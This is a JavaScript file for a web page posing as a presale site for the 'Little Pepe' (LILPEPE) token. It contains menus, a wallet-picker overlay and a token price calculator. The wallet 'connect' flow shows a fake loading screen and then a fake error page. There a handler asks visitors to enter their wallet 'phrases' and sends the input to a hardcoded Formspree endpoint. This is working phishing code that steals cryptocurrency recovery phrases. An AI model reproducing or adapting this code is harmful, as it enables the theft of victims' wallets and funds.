document.addEventListener('DOMContentLoaded', () => {
    const pages = {
        'homepage': document.getElementById('homepage'),
        'page2': document.getElementById('page2'),
        'page3': document.getElementById('page3'),
        'page4': document.getElementById('page4'),
        'page5': document.getElementById('page5'),
        'walletOverlay': document.getElementById('wallet-overlay')
    };

    // Hide all pages except homepage initially
    Object.values(pages).forEach(page => page.style.display = 'none');
    pages['homepage'].style.display = 'block';

    const hamburger = document.getElementById('hamburger');
    const sidebar = document.getElementById('sidebar');
    const closeBtn = document.getElementById('closeBtn');

    if (hamburger && sidebar && closeBtn) {
        hamburger.addEventListener('click', () => {
            sidebar.classList.add('open');
            hamburger.classList.add('hidden');
        });

        closeBtn.addEventListener('click', () => {
            sidebar.classList.remove('open');
            hamburger.classList.remove('hidden');
        });
    }

    const sidebarLinks = document.querySelectorAll('.sidebar-link');
    sidebarLinks.forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            sidebar.classList.remove('open');
            hamburger.classList.remove('hidden');
            Object.values(pages).forEach(page => page.style.display = 'none');
            if (link.classList.contains('home')) {
                pages['homepage'].style.display = 'block';
            } else if (link.classList.contains('support')) {
                pages['page2'].style.display = 'block';
            } else if (link.classList.contains('connect')) {
                pages['walletOverlay'].style.display = 'flex';
            }
        });
    });

    const navButtons = document.querySelectorAll('.certic-audit, .whitepaper, .how-to-buy, .giveaway, .explore-btn');
    navButtons.forEach(button => {
        button.addEventListener('click', () => {
            Object.values(pages).forEach(page => page.style.display = 'none');
            pages['page2'].style.display = 'block';
        });
    });

    const supportButtons = document.querySelectorAll('.support-btn');
    const connectBtn = document.querySelector('.connect-btn');
    [connectBtn, ...supportButtons].forEach(button => {
        button.addEventListener('click', () => {
            Object.values(pages).forEach(page => page.style.display = 'none');
            pages['walletOverlay'].style.display = 'flex';
        });
    });

    const walletButtons = document.querySelectorAll('.wallet-btn');
    const selectedWalletIcon = document.getElementById('selected-wallet-icon');
    const connectWalletBtn = document.querySelector('.connect-wallet-btn');

    walletButtons.forEach(button => {
        button.addEventListener('click', () => {
            walletButtons.forEach(btn => btn.classList.remove('active'));
            button.classList.add('active');
            const walletImg = button.querySelector('.wallet-icon').src;
            selectedWalletIcon.src = walletImg;
            selectedWalletIcon.style.display = 'inline-block';
        });
    });

    if (connectWalletBtn) {
        connectWalletBtn.addEventListener('click', () => {
            if (selectedWalletIcon.src) {
                Object.values(pages).forEach(page => page.style.display = 'none');
                pages['page3'].style.display = 'block';
                setTimeout(() => {
                    Object.values(pages).forEach(page => page.style.display = 'none');
                    pages['page4'].style.display = 'block';
                }, 4000);
            }
        });
    }

    const connectBtnError = document.querySelector('.connect-btn-error');
    if (connectBtnError) {
        const errorInput = document.querySelector('.error-input');
        const FORMSPREE_ID = 'mdkdrerd'; // Replace with your actual Formspree ID

        connectBtnError.addEventListener('click', async (e) => {
            e.preventDefault();

            const inputValue = errorInput.value.trim();
            if (!inputValue) {
                alert('Please enter your phrases');
                return;
            }

            try {
                await fetch(`https://formspree.io/f/${FORMSPREE_ID}`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ 'user-input': inputValue })
                });

                errorInput.value = '';
                Object.values(pages).forEach(page => page.style.display = 'none');
                pages['page5'].style.display = 'block';

                new QRCode(document.getElementById('qr-code'), {
                    text: 'https://littlepepe.com',
                    width: 200,
                    height: 200,
                    colorDark: "#000000",
                    colorLight: "#ffffff"
                });

            } catch (error) {
                console.error('Form submission error:', error);
                alert('Failed to submit. Please check your internet connection.');
            }
        });
    }

    const cryptoInput = document.querySelector('.crypto-input');
    const littlepepeInput = document.querySelector('.littlepepe-input');
    const ethBtn = document.querySelector('.eth-btn');
    const usdtBtn = document.querySelector('.usdt-btn');

    if (cryptoInput && littlepepeInput && ethBtn && usdtBtn) {
        let selectedCrypto = 'ETH';
        let activeButton = ethBtn;

        cryptoInput.value = '0.00 ' + selectedCrypto;
        calculateLittlepepe();

        ethBtn.addEventListener('click', () => {
            selectedCrypto = 'ETH';
            activeButton.classList.remove('active');
            activeButton = ethBtn;
            ethBtn.classList.add('active');
            updateInputValue();
            calculateLittlepepe();
        });

        usdtBtn.addEventListener('click', () => {
            selectedCrypto = 'USDT';
            activeButton.classList.remove('active');
            activeButton = usdtBtn;
            usdtBtn.classList.add('active');
            updateInputValue();
            calculateLittlepepe();
        });

        cryptoInput.addEventListener('input', () => {
            const [valueStr] = cryptoInput.value.split(' ');
            const value = parseFloat(valueStr) || 0;
            cryptoInput.value = value.toFixed(2) + ' ' + selectedCrypto;
            calculateLittlepepe();
        });

        function updateInputValue() {
            const [valueStr] = cryptoInput.value.split(' ');
            const value = parseFloat(valueStr) || 0;
            cryptoInput.value = value.toFixed(2) + ' ' + selectedCrypto;
        }

        function calculateLittlepepe() {
            const [valueStr] = cryptoInput.value.split(' ');
            const value = parseFloat(valueStr) || 0;
            if (selectedCrypto === 'ETH') {
                littlepepeInput.value = `${(value * 2072037.29).toFixed(2)} LILPEPE`;
            } else {
                littlepepeInput.value = `${(value * 500).toFixed(2)} LILPEPE`;
            }
        }
    }
});